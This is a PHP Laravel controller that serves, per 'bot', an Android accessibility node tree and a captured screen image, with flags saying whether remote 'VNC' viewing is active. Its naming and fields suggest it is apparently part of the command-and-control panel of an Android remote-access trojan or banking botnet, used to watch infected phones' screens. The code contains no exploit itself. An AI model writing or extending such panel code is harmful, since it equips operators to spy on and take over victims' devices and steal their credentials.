<?php

namespace App\Http\Controllers\Api\v1\Bot;


use App\Helpers\ApiResponse;
use App\Models\Bot;
use App\Models\BotVNC;

class BotVNCController
{
    public function show(Bot $bot): ApiResponse
    {
        $vnc = BotVNC::where("bot_id", $bot->id)->first();

        if (!$vnc) {
            return ApiResponse::success([
                "botId" => $bot->id,
                "tree" => [],
                "screen" => NULL,
                "isActive" => false,
                "updatedAt" => "",
            ]);
        }

        $isActive = isset($bot->sub_info["vnc_work_tree"], $bot->sub_info["vnc_work_image"])
            && $bot->sub_info["vnc_work_tree"] === "true" && $bot->sub_info["vnc_work_image"] === "true";

        $tree = $vnc->tree;

        $tree = $this->deleteKeysFromNestedArray($tree, [
            "mInfo",
            "extras",
            "hintText",
            "windowId",
            "extraData",
            "inputType",
            "childCount",
            "isMultiLine",
            "drawingOrder",
            "isScrollable",
            "isDismissable",
            "maxTextLength",
            "isLongClickable",
            "isContentInvalid",
            "textSelectionEnd",
            "isShowingHintText",
            "isContextClickable",
            "textSelectionStart",
            "movementGranularities",
            "isAccessibilityFocused",
            "isImportantForAccessibility",
            "mInfo",
        ]);

        return ApiResponse::success([
            "botId" => $bot->id,
            "tree" => $isActive && $vnc->tree ? $tree : [],
            "screen" => $isActive && $vnc->image_blob ? trim($vnc->image_blob, '"') : NULL,
            "isActive" => $isActive,
            "updatedAt" => $vnc->updated_at,
        ]);
    }

    protected function deleteKeysFromNestedArray(array $array, array $keys): array
    {
        foreach ($array as $key => $value) {
            if (in_array($key, $keys, true)) {
                unset($array[$key]);
            } else if (is_array($value)) {
                $array[$key] = $this->deleteKeysFromNestedArray($value, $keys);
            }
        }

        return $array;
    }
}
